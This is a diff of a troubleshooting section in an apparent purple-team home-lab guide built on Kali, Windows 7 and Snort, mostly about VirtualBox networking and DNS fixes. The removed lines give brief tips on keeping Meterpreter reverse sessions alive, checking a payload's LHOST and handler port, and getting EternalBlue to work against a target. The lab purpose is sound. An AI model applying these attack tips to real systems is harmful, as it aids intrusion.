-**Sensor sees no traffic between Kali and Windows 7**
-Promiscuous mode is not set to `Allow All` on the sensor's adapter in the VirtualBox
-settings, or the interface is not in PROMISC. See Step 0.2. This is the single most
-common failure in this build.
+Problems actually hit during this build, with resolutions. This is report material —
+a lab-build section that admits what broke reads as experience.
 
-**Meterpreter session opens then immediately dies**
-Almost always architecture mismatch — a 64-bit payload on a 32-bit target or the
-reverse. Check `wmic os get osarchitecture` and regenerate. Failing that, migrate to a
-stable process faster.
+**Ubuntu installer hung at `vmw_host_log` errors**
+Not a graphics problem despite appearances. Host VBS held VT-x, so VirtualBox fell
+back to NEM and the installer could not complete. `nomodeset`, video memory increases,
+single-CPU and paravirtualisation changes all failed. Root cause confirmed in
+`VBox.log`: `HM: HMR3Init: Attempting fall back to NEM: VT-x is not available`.
+Resolved by abandoning the third VM rather than disabling host security.
 
-**Victim never connects back**
-Firewall still on somewhere, wrong LHOST baked into the payload, or the handler is not
-actually listening. Confirm with `netstat -tlnp | grep 4444` on Kali.
+**Kali DNS failed with a NAT adapter attached**
+`Temporary failure resolving 'http.kali.org'` despite a valid-looking route. The
+NetworkManager profile still carried a static `192.168.1.10` address and
+`192.168.1.1` gateway from an earlier bridged configuration. A NAT adapter cannot
+route an address from a network it does not serve. Fixed with
+`nmcli con mod "Wired connection 1" ipv4.method auto ipv4.addresses "" ipv4.gateway ""`,
+after which DHCP returned `10.0.3.15` (slot 2 → `10.0.3.x`; slot 1 would be
+`10.0.2.x`).
 
-**EternalBlue reports "not vulnerable"**
-SMBv1 is disabled on the target, or the patch is present. Re-check Step 0.4 and
-confirm with the `smb_ms17_010` scanner.
+**Kali `eth0` drifted to `192.168.56.104`**
+Left over from before DHCP was disabled on the host-only network. Pinned with
+`nmcli con mod hostonly ipv4.method manual ipv4.addresses 192.168.56.10/24`. An
+address that moves between reboots invalidates rules and pcap filters — pin it early.
 
-**Snort will not start — config errors**
-Read the line number in the error. Usually an uncommented `include` pointing at a
-ruleset file that is not present, or a whitelist/blacklist path from the preprocessor
-section. Comment those out too.
-
-**Snort runs but never alerts**
-Wrong interface with `-i`, `HOME_NET` does not match your actual subnet, or
-`local.rules` is still commented out in Step 7 of the config.
-
-**Anything else** — capture the exact error text and bring it to me. Troubleshooting
-notes are worth keeping; the problems you solved are report material.
+**Two host-only adapters present**
+`VirtualBox Host-Only Ethernet Adapter #2` on `169.254.x` is unrelated to this lab.
+Attaching a VM to it produces a machine that cannot reach anything while every
+setting looks correct.
 
 ---
 
 ## When you are done
 
-Hand me the collected report and evidence. I will build out the full repository —
-documentation set, Python analysis tooling, results and charts, tests, README, git
-history — in `D:\Project-2-Purple-Team-Lab`, ready to push to GitHub, with a mirrored
-backup elsewhere on D:.
+Hand over the collected evidence and I will build out the repository: documentation
+set, analysis tooling, metrics and charts, tests, finished README, commit history,
+and a mirrored backup on D:.
